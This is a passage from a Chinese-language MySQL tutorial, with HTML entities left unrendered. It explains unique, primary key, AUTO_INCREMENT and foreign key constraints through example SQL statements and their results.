# &#x521B;&#x5EFA;&#x552F;&#x4E00;&#x7EA6;&#x675F;,&#x82E5;&#x4E0D;&#x7ED9;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x540D;,&#x9ED8;&#x8BA4;&#x548C;&#x5217;&#x540D;&#x76F8;&#x540C;.
mysql&gt; INSERT INTO test2 (id,last_name,email,salary) VALUES (1,&apos;zs&apos;,&apos;zs@mail.com&apos;,99999);
mysql&gt; SELECT * FROM test2;
+------+-----------+-------------+----------+
| id   | last_name | email       | salary   |
+------+-----------+-------------+----------+
|    1 | zs        | zs@mail.com | 99999.00 |
+------+-----------+-------------+----------+
mysql&gt; INSERT INTO test2 (id,last_name,email,salary) VALUES (1,&apos;zscopy&apos;,&apos;zscpoy@mail.com&apos;,99999);
ERROR 1062 (23000): Duplicate entry &apos;1&apos; for key &apos;test2.id&apos;
# &#x53EF;&#x4EE5;&#x5411;unique&#x7684;&#x5B57;&#x6BB5;&#x6DFB;&#x52A0;null&#x503C;,&#x4E14;&#x53EF;&#x4EE5;&#x591A;&#x6B21;&#x6DFB;&#x52A0;null
INSERT INTO test2 (id,last_name,email,salary) VALUES (2,&apos;gz&apos;,NULL,99998);
INSERT INTO test2 (id,last_name,email,salary) VALUES (3,&apos;hz&apos;,NULL,99997);
/*
&#x521B;&#x5EFA;&#x8868;&#x540E;&#x6DFB;&#x52A0;&#x7EA6;&#x675F;
ALTER TABLE &#x8868;&#x540D; ADD UNIQUE key(&#x5B57;&#x6BB5;&#x5217;&#x8868;);
ALTER TABLE &#x8868;&#x540D; MODIFY &#x5B57;&#x6BB5;&#x540D; &#x5B57;&#x6BB5;&#x7C7B;&#x578B; UNIQUE;
*/
# &#x82E5;&#x5DF2;&#x5B58;&#x5728; salary &#x76F8;&#x7B49;&#x7684;&#x60C5;&#x51B5;,&#x9700;&#x8981;&#x4FEE;&#x6539;&#x540E;&#x624D;&#x53EF;&#x8BBE;&#x7F6E;
mysql&gt; ALTER TABLE test2 ADD CONSTRAINT uni_test2_sal UNIQUE (salary);
mysql&gt; ALTER TABLE test2 MODIFY last_name VARCHAR(15) UNIQUE;
# &#x590D;&#x5408;&#x7684;&#x552F;&#x4E00;&#x6027;&#x7EA6;&#x675F; + &#x8868;&#x7EA7;&#x7EA6;&#x675F;
mysql&gt; CREATE TABLE USER(id INT,`name` VARCHAR(15), `password` VARCHAR(25), CONSTRAINT uni_user_name_pwd UNIQUE (`name`,`password`));
mysql&gt; INSERT INTO USER VALUES (1, &apos;zs&apos;, &apos;abc&apos;);
# &#x590D;&#x5408;&#x7EA6;&#x675F;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x6709;&#x533A;&#x522B;&#x5373;&#x53EF;
mysql&gt; INSERT INTO USER VALUES (1, &apos;zscopy&apos;, &apos;abc&apos;);
</code></pre>
<p>&#x6DFB;&#x52A0;&#x552F;&#x4E00;&#x6027;&#x7EA6;&#x675F;&#x7684;&#x5217;&#x4E0A;&#x4E5F;&#x4F1A;&#x81EA;&#x52A8;&#x521B;&#x5EFA;&#x552F;&#x4E00;&#x7D22;&#x5F15;&#x3002;&#x5220;&#x9664;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x5220;&#x9664;&#x552F;&#x4E00;&#x7D22;&#x5F15;&#x7684;&#x65B9;&#x5F0F;&#x5220;&#x9664;&#x3002;&#x5220;&#x9664;&#x65F6;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x552F;&#x4E00;&#x7D22;&#x5F15;&#x540D;&#xFF0C;&#x552F;&#x4E00;&#x7D22;&#x5F15;&#x540D;&#x5C31;&#x548C;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x540D;&#x4E00;&#x6837;&#x3002;&#x5982;&#x679C;&#x521B;&#x5EFA;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x65F6;&#x672A;&#x6307;&#x5B9A;&#x540D;&#x79F0;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x5355;&#x5217;&#xFF0C;&#x5C31;&#x9ED8;&#x8BA4;&#x548C;&#x5217;&#x540D;&#x76F8;&#x540C;&#xFF1B;&#x5982;&#x679C;&#x662F;&#x7EC4;&#x5408;&#x5217;&#xFF0C;&#x90A3;&#x4E48;&#x9ED8;&#x8BA4;&#x548C;&#x62EC;&#x53F7;&#x4E2D;&#x6392;&#x5728;&#x7B2C;&#x4E00;&#x4E2A;&#x7684;&#x5217;&#x540D;&#x76F8;&#x540C;&#x3002;&#x4E5F;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x552F;&#x4E00;&#x6027;&#x7EA6;&#x675F;&#x540D;&#x3002;</p>
<pre><code class="language-sql">mysql&gt; ALTER TABLE test2 DROP INDEX last_name;
mysql&gt; ALTER TABLE test2 DROP INDEX uni_test2_sal;
mysql&gt; SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;test2&apos;;
mysql&gt; DESC test2;
</code></pre>
<h3 id="%E4%B8%BB%E9%94%AE%E7%BA%A6%E6%9D%9F">&#x4E3B;&#x952E;&#x7EA6;&#x675F;</h3>
<p>&#x5B9E;&#x4F53;&#x5B8C;&#x6574;&#x6027;&#x5373;&#x4E00;&#x5F20;&#x8868;&#x4E2D;&#x4E0D;&#x80FD;&#x5B58;&#x5728;&#x4E24;&#x4E2A;&#x5B8C;&#x5168;&#x76F8;&#x540C;&#x65E0;&#x6CD5;&#x533A;&#x5206;&#x7684;&#x8BB0;&#x5F55;&#x3002;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x7528;&#x6765;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x8868;&#x4E2D;&#x7684;&#x4E00;&#x884C;&#x8BB0;&#x5F55;&#x3002;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x76F8;&#x5F53;&#x4E8E;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x4E0E;&#x975E;&#x7A7A;&#x7EA6;&#x675F;&#x7684;&#x7EC4;&#x5408;&#xFF0C;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x5217;&#x4E0D;&#x5141;&#x8BB8;&#x91CD;&#x590D;&#xFF0C;&#x4E5F;&#x4E0D;&#x5141;&#x8BB8;&#x51FA;&#x73B0;&#x7A7A;&#x503C;&#x3002;</p>
<p>&#x4E00;&#x4E2A;&#x8868;&#x6700;&#x591A;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#xFF0C;&#x5EFA;&#x7ACB;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x53EF;&#x4EE5;&#x5728;&#x5217;&#x7EA7;&#x522B;&#x521B;&#x5EFA;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x8868;&#x7EA7;&#x522B;&#x4E0A;&#x521B;&#x5EFA;&#x3002;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x5BF9;&#x5E94;&#x7740;&#x8868;&#x4E2D;&#x7684;&#x4E00;&#x5217;&#x6216;&#x8005;&#x591A;&#x5217;&#xFF08;&#x590D;&#x5408;&#x4E3B;&#x952E;&#xFF09;&#x3002;&#x5982;&#x679C;&#x662F;&#x591A;&#x5217;&#x7EC4;&#x5408;&#x7684;&#x590D;&#x5408;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E9B;&#x5217;&#x90FD;&#x4E0D;&#x5141;&#x8BB8;&#x4E3A;&#x7A7A;&#x503C;&#xFF0C;&#x5E76;&#x4E14;&#x7EC4;&#x5408;&#x7684;&#x503C;&#x4E0D;&#x5141;&#x8BB8;&#x91CD;&#x590D;&#x3002;&#x81EA;&#x884C;&#x547D;&#x540D;&#x7684;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x540D;&#x65E0;&#x6548;&#x3002;&#x5F53;&#x521B;&#x5EFA;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x4F1A;&#x5728;&#x6240;&#x5728;&#x7684;&#x5217;&#x6216;&#x5217;&#x7EC4;&#x5408;&#x4E0A;&#x5EFA;&#x7ACB;&#x5BF9;&#x5E94;&#x7684;&#x4E3B;&#x952E;&#x7D22;&#x5F15;&#xFF08;&#x80FD;&#x591F;&#x6839;&#x636E;&#x4E3B;&#x952E;&#x67E5;&#x8BE2;&#x7684;&#xFF0C;&#x5C31;&#x6839;&#x636E;&#x4E3B;&#x952E;&#x67E5;&#x8BE2;&#xFF0C;&#x6548;&#x7387;&#x66F4;&#x9AD8;&#xFF09;&#x3002;&#x5982;&#x679C;&#x5220;&#x9664;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x4E86;&#xFF0C;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x5BF9;&#x5E94;&#x7684;&#x7D22;&#x5F15;&#x5C31;&#x81EA;&#x52A8;&#x5220;&#x9664;&#x4E86;&#x3002;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x4E00;&#x70B9;&#x662F;&#xFF0C;&#x4E0D;&#x8981;&#x4FEE;&#x6539;&#x4E3B;&#x952E;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x3002;&#x56E0;&#x4E3A;&#x4E3B;&#x952E;&#x662F;&#x6570;&#x636E;&#x8BB0;&#x5F55;&#x7684;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#xFF0C;&#x5982;&#x679C;&#x4FEE;&#x6539;&#x4E86;&#x4E3B;&#x952E;&#x7684;&#x503C;&#xFF0C;&#x5C31;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x7834;&#x574F;&#x6570;&#x636E;&#x7684;&#x5B8C;&#x6574;&#x6027;&#x3002;</p>
<pre><code class="language-sql">/* &#x521B;&#x5EFA;&#x8868;&#x65F6;&#x6DFB;&#x52A0;&#x7EA6;&#x675F; */
# &#x4E00;&#x4E2A;&#x8868;&#x4E2D;&#x6700;&#x591A;&#x6709;&#x4E00;&#x4E2A;&#x4E3B;&#x952E;&#x7EA6;&#x675F;
# &#x5217;&#x7EA7;&#x7EA6;&#x675F;
mysql&gt; CREATE TABLE test3 (id INT PRIMARY KEY,last_name VARCHAR(15),salary DECIMAL(10,2),email VARCHAR(25));
# &#x8868;&#x7EA7;&#x7EA6;&#x675F; =&gt; &#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x8D77;&#x540D;
mysql&gt; CREATE TABLE test4 (id INT,last_name VARCHAR(15),salary DECIMAL(10,2),email VARCHAR(25),CONSTRAINT pk_test4_id PRIMARY KEY(id));
mysql&gt; SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;test4&apos;;
mysql&gt; INSERT INTO test4 VALUES(1,&apos;zs&apos;,99999,&apos;zs@mail.com&apos;);
mysql&gt; INSERT INTO test4 VALUES(1,&apos;zscopy&apos;,99999,&apos;zscopy@mail.com&apos;);
ERROR 1062 (23000): Duplicate entry &apos;1&apos; for key &apos;test4.PRIMARY&apos;
mysql&gt; INSERT INTO test4 VALUES(NULL,&apos;zscopy&apos;,99999,&apos;zscopy@mail.com&apos;);
ERROR 1048 (23000): Column &apos;id&apos; cannot be null
# &#x590D;&#x5408;&#x4E3B;&#x952E;&#x7EA6;&#x675F;
mysql&gt; CREATE TABLE test5(id INT,`name` VARCHAR(15),`password` VARCHAR(25),PRIMARY KEY (`name`,`password`));
mysql&gt; INSERT INTO test5 VALUES (1,&apos;zs&apos;,&apos;abc&apos;);
mysql&gt; INSERT INTO test5 VALUES (1,&apos;zscopy&apos;,&apos;abc&apos;);
# &#x591A;&#x5217;&#x7EC4;&#x5408;&#x7684;&#x590D;&#x5408;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x90FD;&#x4E0D;&#x53EF;&#x4EE5;&#x4E3A;NULL
mysql&gt; INSERT INTO test5 VALUES (1,NULL,&apos;abc&apos;);
ERROR 1048 (23000): Column &apos;name&apos; cannot be null
/* &#x521B;&#x5EFA;&#x8868;&#x540E;&#x6DFB;&#x52A0;&#x7EA6;&#x675F; */
mysql&gt; CREATE TABLE test6(id INT,`name` VARCHAR(15),`password` VARCHAR(25));
mysql&gt; ALTER table test6 ADD PRIMARY KEY (id);
mysql&gt; DESC test6;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| id       | int         | NO   | PRI | NULL    |       |
| name     | varchar(15) | YES  |     | NULL    |       |
| password | varchar(25) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
/*
&#x5220;&#x9664;&#x4E3B;&#x952E;&#x7EA6;&#x675F; =&gt; &#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x6839;&#x672C;&#x4E0D;&#x4F1A;&#x53BB;&#x505A;
ALTER TABLE &#x8868;&#x540D;&#x79F0; DROP PRIMARY KEY;
*/
mysql&gt; ALTER TABLE test6 DROP PRIMARY KEY;
</code></pre>
<h3 id="%E8%87%AA%E5%A2%9E%E5%88%97-autoincrement">&#x81EA;&#x589E;&#x5217; AUTO_INCREMENT</h3>
<p>&#x81EA;&#x589E;&#x5217;&#x53EF;&#x4EE5;&#x4F7F;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x81EA;&#x589E;&#xFF0C;&#x5728;&#x5F00;&#x53D1;&#x4E2D;&#x5982;&#x679C;&#x4E3B;&#x952E;&#x8BBE;&#x7F6E;&#x4E86;&#x81EA;&#x589E;&#xFF0C;&#x540E;&#x7EED;&#x5199; sql &#x5C31;&#x4E0D;&#x7528;&#x518D;&#x5199;&#x4E3B;&#x952E;&#x5217;&#x4E86;&#x3002;</p>
<p>&#x4E00;&#x4E2A;&#x8868;&#x6700;&#x591A;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x81EA;&#x589E;&#x957F;&#x5217;&#x3002;&#x5F53;&#x9700;&#x8981;&#x4EA7;&#x751F;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x7B26;&#x6216;&#x987A;&#x5E8F;&#x503C;&#x65F6;&#xFF0C;&#x53EF;&#x8BBE;&#x7F6E;&#x81EA;&#x589E;&#x957F;&#x3002;&#x81EA;&#x589E;&#x957F;&#x5217;&#x7EA6;&#x675F;&#x7684;&#x5217;&#x5FC5;&#x987B;&#x662F;&#x952E;&#x5217;&#xFF0C;&#x4E3B;&#x952E;&#x5217;&#x6216;&#x8005;&#x552F;&#x4E00;&#x952E;&#x5217;&#x3002;&#x81EA;&#x589E;&#x7EA6;&#x675F;&#x7684;&#x5217;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5FC5;&#x987B;&#x662F;&#x6574;&#x6570;&#x7C7B;&#x578B;&#x3002;&#x82E5;&#x81EA;&#x589E;&#x5217;&#x6307;&#x5B9A;&#x4E86; 0 &#x548C; null&#xFF0C;&#x4F1A;&#x5728;&#x5F53;&#x524D;&#x6700;&#x5927;&#x503C;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x81EA;&#x589E;&#xFF1B;&#x5982;&#x679C;&#x81EA;&#x589E;&#x5217;&#x624B;&#x52A8;&#x6307;&#x5B9A;&#x4E86;&#x5177;&#x4F53;&#x503C;&#xFF0C;&#x76F4;&#x63A5;&#x8D4B;&#x503C;&#x4E3A;&#x5177;&#x4F53;&#x503C;&#x3002;</p>
<pre><code class="language-sql">/* &#x521B;&#x5EFA;&#x8868;&#x65F6;&#x81EA;&#x589E; */
mysql&gt; CREATE TABLE test7 (id INT PRIMARY KEY AUTO_INCREMENT, last_name VARCHAR(15));
mysql&gt; INSERT INTO test7(last_name) VALUES (&apos;zs&apos;);
mysql&gt; SELECT * FROM test7;
+----+-----------+
| id | last_name |
+----+-----------+
|  1 | zs        |
+----+-----------+
# &#x5728;&#x5305;&#x542B;&#x4E86; AUTO_INCREMENT &#x4E3B;&#x952E;&#x5B57;&#x6BB5;&#x4E0A;&#x586B;&#x5199; 0 &#x6216;&#x8005; NULL =&gt; &#x5B9E;&#x9645;&#x4E0A;&#x5F80;&#x4E0A;&#x81EA;&#x52A8;&#x7684;&#x6DFB;&#x52A0;&#x5B57;&#x6BB5;&#x7684;&#x6570;&#x503C;. =&gt; &#x6B63;&#x503C;&#x53EF;&#x80FD;&#x4F1A;&#x8DF3;&#x8DC3;&#x3001;&#x8D1F;&#x503C;&#x4F1A;&#x6309;&#x81EA;&#x589E;&#x5F80;&#x524D;&#x5806;.
/*
&#x521B;&#x5EFA;&#x8868;&#x540E;&#x81EA;&#x589E;
alter table &#x8868;&#x540D;&#x79F0; modify &#x5B57;&#x6BB5;&#x540D; &#x6570;&#x636E;&#x7C7B;&#x578B; auto_increment;
*/
mysql&gt; CREATE TABLE test8 (id INT PRIMARY KEY, last_name VARCHAR(15));
mysql&gt; ALTER TABLE TEST8 MODIFY ID INT AUTO_INCREMENT;
/*
&#x5220;&#x9664;&#x81EA;&#x589E;
alter table &#x8868;&#x540D;&#x79F0; modify &#x5B57;&#x6BB5;&#x540D; &#x6570;&#x636E;&#x7C7B;&#x578B;;
*/
mysql&gt; ALTER TABLE test8 MODIFY id INT;
</code></pre>
<ul>
<li>MySQL 8.0 &#x65B0;&#x7279;&#x6027;&#x81EA;&#x589E;&#x53D8;&#x91CF;&#x7684;&#x6301;&#x4E45;&#x5316;</li>
</ul>
<pre><code class="language-sql">/*
&#x5728; MySQL 8.0 &#x4E4B;&#x524D;,&#x81EA;&#x589E;&#x4E3B;&#x952E; AUTO_INCREMENT &#x7684;&#x503C;&#x5982;&#x679C;&#x5927;&#x4E8E; max(primary key)+1,&#x5728; MySQL &#x91CD;&#x542F;&#x540E;&#x4F1A;&#x91CD;&#x7F6E; AUTO_INCREMENT=max(primary key)+1.&#x8FD9;&#x79CD;&#x73B0;&#x8C61;&#x5728;&#x67D0;&#x4E9B;&#x60C5;&#x51B5;&#x4E0B;&#x4F1A;&#x5BFC;&#x81F4;&#x4E1A;&#x52A1;&#x4E3B;&#x952E;&#x51B2;&#x7A81;&#x6216;&#x8005;&#x5176;&#x4ED6;&#x95EE;&#x9898;.
*/
# MySQL 5.7
mysql&gt; CREATE TABLE test9(id INT PRIMARY KEY AUTO_INCREMENT);
mysql&gt; INSERT INTO test9 VALUES (0),(0),(0),(0);
mysql&gt; SELECT * FROM test9;
mysql&gt; DELETE FROM test9 WHERE id = 4;
mysql&gt; INSERT INTO test9 VALUES(0);
mysql&gt; SELECT * FROM test9;
mysql&gt; DELETE FROM test9 where id=5;
# &#x91CD;&#x542F;&#x6570;&#x636E;&#x5E93;&#x91CD;&#x65B0;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x7A7A;&#x503C;
mysql&gt; INSERT INTO test1 values(0);
# &#x4ECE;&#x7ED3;&#x679C;&#x53EF;&#x4EE5;&#x770B;&#x51FA;,&#x65B0;&#x63D2;&#x5165;&#x7684;0&#x503C;&#x5206;&#x914D;&#x7684;&#x662F;4.&#x6309;&#x7167;&#x91CD;&#x542F;&#x524D;&#x7684;&#x64CD;&#x4F5C;&#x903B;&#x8F91;,&#x6B64;&#x5904;&#x5E94;&#x8BE5;&#x5206;&#x914D;6. =&gt; &#x81EA;&#x589E;&#x4E3B;&#x952E;&#x6CA1;&#x6709;&#x6301;&#x4E45;&#x5316;.
/*
&#x5728; MySQL 5.7 &#x4E2D;&#x5BF9;&#x4E8E;&#x81EA;&#x589E;&#x4E3B;&#x952E;&#x7684;&#x5206;&#x914D;&#x89C4;&#x5219;,&#x662F;&#x7531;InnoDB&#x6570;&#x636E;&#x5B57;&#x5178;&#x5185;&#x90E8;&#x4E00;&#x4E2A;&#x8BA1;&#x6570;&#x5668;&#x6765;&#x51B3;&#x5B9A;&#x7684;.&#x800C;&#x8BE5;&#x8BA1;&#x6570;&#x5668;&#x53EA;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x7EF4;&#x62A4;,&#x5E76;&#x4E0D;&#x4F1A;&#x6301;&#x4E45;&#x5316;&#x5230;&#x78C1;&#x76D8;&#x4E2D;.&#x5F53;&#x6570;&#x636E;&#x5E93;&#x91CD;&#x542F;&#x65F6;,&#x8BE5;&#x8BA1;&#x6570;&#x5668;&#x4F1A;&#x88AB;&#x521D;&#x59CB;&#x5316;.
*/
mysql&gt; SELECT * FROM test1;
+----+
| id |
+----+
|  1 |
|  2 |
|  3 |
|  4 |
+----+
# MySQL 8.0
/*
MySQL 8.0 &#x5C06;&#x81EA;&#x589E;&#x4E3B;&#x952E;&#x7684;&#x8BA1;&#x6570;&#x5668;&#x6301;&#x4E45;&#x5316;&#x5230;&#x91CD;&#x505A;&#x65E5;&#x5FD7;&#x4E2D;.&#x6BCF;&#x6B21;&#x8BA1;&#x6570;&#x5668;&#x53D1;&#x751F;&#x6539;&#x53D8;,&#x90FD;&#x4F1A;&#x5C06;&#x5176;&#x5199;&#x5165;&#x91CD;&#x505A;&#x65E5;&#x5FD7;.&#x5982;&#x679C;&#x6570;&#x636E;&#x5E93;&#x91CD;&#x542F;,InnoDB &#x4F1A;&#x6839;&#x636E;&#x91CD;&#x505A;&#x65E5;&#x5FD7;&#x4E2D;&#x7684;&#x4FE1;&#x606F;&#x6765;&#x521D;&#x59CB;&#x5316;&#x8BA1;&#x6570;&#x5668;&#x7684;&#x5185;&#x5B58;&#x503C;.
*/
mysql&gt; SELECT * FROM test1;
+----+
| id |
+----+
|  1 |
|  2 |
|  3 |
|  6 |
+----+
</code></pre>
<h3 id="foreign-key-%E7%BA%A6%E6%9D%9F">FOREIGN KEY &#x7EA6;&#x675F;</h3>
<p>&#x5916;&#x952E;&#x7EA6;&#x675F;&#x9650;&#x5B9A;&#x67D0;&#x4E2A;&#x8868;&#x4E2D;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x5F15;&#x7528;&#x5B8C;&#x6574;&#x6027;&#x3002;&#x7B80;&#x800C;&#x8A00;&#x4E4B;&#xFF0C;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x5373;&#x662F;&#x4ECE;&#x8868;&#x6DFB;&#x52A0;&#x6570;&#x636E;&#x65F6;&#x7684;&#x503C;&#xFF0C;&#x5FC5;&#x987B;&#x662F;&#x4E3B;&#x8868;&#x5B57;&#x6BB5;&#x4E2D;&#x5DF2;&#x5B58;&#x5728;&#x7684;&#x503C;&#x3002;&#x4E3B;&#x8868;&#x5373;&#x7236;&#x8868;&#xFF0C;&#x662F;&#x88AB;&#x5F15;&#x7528;&#x53C2;&#x8003;&#x7684;&#x8868;&#xFF1B;&#x4ECE;&#x8868;&#x5373;&#x5B50;&#x8868;&#xFF0C;&#x662F;&#x5F15;&#x7528;&#x522B;&#x4EBA;&#x53C2;&#x8003;&#x522B;&#x4EBA;&#x7684;&#x8868;&#x3002;&#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x5458;&#x5DE5;&#x8868;&#x9700;&#x8981;&#x53C2;&#x8003;&#x90E8;&#x95E8;&#x8868;&#x7ED9;&#x5458;&#x5DE5;&#x5728;&#x6570;&#x636E;&#x5E93;&#x5206;&#x914D;&#x90E8;&#x95E8;&#xFF0C;&#x8FD9;&#x4E2A;&#x90E8;&#x95E8;&#x5FC5;&#x987B;&#x662F;&#x5728;&#x88AB;&#x5F15;&#x7528;&#x7684;&#x4E3B;&#x8868;&#xFF0C;&#x5373;&#x90E8;&#x95E8;&#x8868;&#x4E2D;&#x5B58;&#x5728;&#x7684;&#x3002;</p>
<p>&#x4ECE;&#x8868;&#x7684;&#x5916;&#x952E;&#x5217;&#xFF0C;&#x5FC5;&#x987B;&#x5F15;&#x7528;&#x4E3B;&#x8868;&#x7684;&#x4E3B;&#x952E;&#x6216;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x7684;&#x5217;&#xFF0C;&#x56E0;&#x4E3A;&#x88AB;&#x4F9D;&#x8D56;&#x7684;&#x503C;&#x5FC5;&#x987B;&#x662F;&#x552F;&#x4E00;&#x7684;&#x3002;<strong>&#x5728;&#x521B;&#x5EFA;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x65F6;&#xFF0C;&#x82E5;&#x4E0D;&#x7ED9;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x547D;&#x540D;&#xFF0C;&#x9ED8;&#x8BA4;&#x540D;&#x4E0D;&#x662F;&#x5217;&#x540D;&#xFF0C;&#x800C;&#x662F;&#x81EA;&#x52A8;&#x4EA7;&#x751F;&#x7684;&#x4E00;&#x4E2A;&#x5916;&#x952E;&#x540D;</strong>&#x3002;&#x521B;&#x5EFA;&#x8868;&#x65F6;&#x5C31;&#x6307;&#x5B9A;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x7684;&#x8BDD;&#xFF0C;&#x5E94;&#x5148;&#x521B;&#x5EFA;&#x4E3B;&#x8868;&#xFF0C;&#x518D;&#x521B;&#x5EFA;&#x4ECE;&#x8868;&#xFF1B;&#x5220;&#x8868;&#x65F6;&#xFF0C;&#x5148;&#x5220;&#x4ECE;&#x8868;&#x6216;&#x5148;&#x5220;&#x9664;&#x5916;&#x952E;&#x7EA6;&#x675F;&#xFF0C;&#x518D;&#x5220;&#x9664;&#x4E3B;&#x8868;&#x3002;&#x56E0;&#x4E3A;&#x4ECE;&#x8868;&#x5F15;&#x7528;&#x7740;&#x4E3B;&#x8868;&#x7684;&#x4E3B;&#x952E;&#xFF0C;&#x5982;&#x679C;&#x5148;&#x5220;&#x4E3B;&#x8868;&#x5C31;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x56E0;&#x4E3A;&#x4ECE;&#x8868;&#x8FD8;&#x5F15;&#x7528;&#x7740;&#x4E3B;&#x8868;&#x7684;&#x4E3B;&#x952E;&#x3002;&#x5F53;&#x4E3B;&#x8868;&#x7684;&#x8BB0;&#x5F55;&#x88AB;&#x4ECE;&#x8868;&#x53C2;&#x7167;&#x65F6;&#xFF0C;&#x4E3B;&#x8868;&#x7684;&#x8BB0;&#x5F55;&#x5C06;&#x4E0D;&#x5141;&#x8BB8;&#x5220;&#x9664;&#xFF0C;&#x5982;&#x679C;&#x8981;&#x5220;&#x9664;&#x6570;&#x636E;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5220;&#x9664;&#x4ECE;&#x8868;&#x4E2D;&#x4F9D;&#x8D56;&#x8BE5;&#x8BB0;&#x5F55;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x624D;&#x53EF;&#x4EE5;&#x5220;&#x9664;&#x4E3B;&#x8868;&#x7684;&#x6570;&#x636E;&#x3002;&#x5E94;&#x5728;&#x4ECE;&#x8868;&#x4E2D;&#x6307;&#x5B9A;&#x5916;&#x952E;&#x7EA6;&#x675F;&#xFF0C;&#x4F46;&#x662F;&#x4E00;&#x4E2A;&#x8868;&#x53EF;&#x4EE5;&#x5EFA;&#x7ACB;&#x591A;&#x4E2A;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x3002;&#x4ECE;&#x8868;&#x7684;&#x5916;&#x952E;&#x5217;&#x4E0E;&#x4E3B;&#x8868;&#x88AB;&#x53C2;&#x7167;&#x7684;&#x5217;&#x540D;&#x5B57;&#x53EF;&#x4EE5;&#x4E0D;&#x76F8;&#x540C;&#xFF0C;&#x4F46;&#x662F;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5FC5;&#x987B;&#x4E00;&#x6837;&#xFF0C;&#x903B;&#x8F91;&#x610F;&#x4E49;&#x4E00;&#x81F4;&#x3002;&#x5982;&#x679C;&#x7C7B;&#x578B;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x521B;&#x5EFA;&#x5B50;&#x8868;&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x51FA;&#x73B0;&#x9519;&#x8BEF; &quot;ERROR 1005 (HY000)&quot;&#x3002;&#x5F53;&#x521B;&#x5EFA;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x4F1A;&#x5728;&#x6240;&#x5728;&#x7684;&#x5217;&#x4E0A;&#x5EFA;&#x7ACB;&#x5BF9;&#x5E94;&#x7684;&#x666E;&#x901A;&#x7D22;&#x5F15;&#x3002;&#x4F46;&#x662F;&#x7D22;&#x5F15;&#x540D;&#x662F;&#x5916;&#x952E;&#x7684;&#x7EA6;&#x675F;&#x540D;&#xFF08;&#x6839;&#x636E;&#x5916;&#x952E;&#x67E5;&#x8BE2;&#x6548;&#x7387;&#x5F88;&#x9AD8;&#xFF09;&#x3002;&#x5220;&#x9664;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x540E;&#xFF0C;&#x5FC5;&#x987B;&#x624B;&#x52A8;&#x5220;&#x9664;&#x5BF9;&#x5E94;&#x7684;&#x7D22;&#x5F15;&#x3002;</p>
<pre><code class="language-sql">/* &#x5728;&#x521B;&#x5EFA;&#x8868;&#x65F6;&#x6DFB;&#x52A0; */
# &#x521B;&#x5EFA;&#x4E3B;&#x8868;&#x4E0E;&#x4ECE;&#x8868; -- &#x8868;&#x7EA7;&#x7EA6;&#x675F;
mysql&gt; CREATE TABLE dept1(dept_id INT,dept_name VARCHAR(15));
mysql&gt; CREATE TABLE emp1(emp_id INT PRIMARY KEY AUTO_INCREMENT,emp_name VARCHAR(15),department_id INT,CONSTRAINT fk_emp1_dept_id FOREIGN KEY (department_id) REFERENCES dept1(dept_id)); # ERROR 1822 (HY000): Failed to add the foreign key constraint. Missing index for constraint &apos;fk_emp1_dept_id&apos; in the referenced table &apos;dept1&apos;
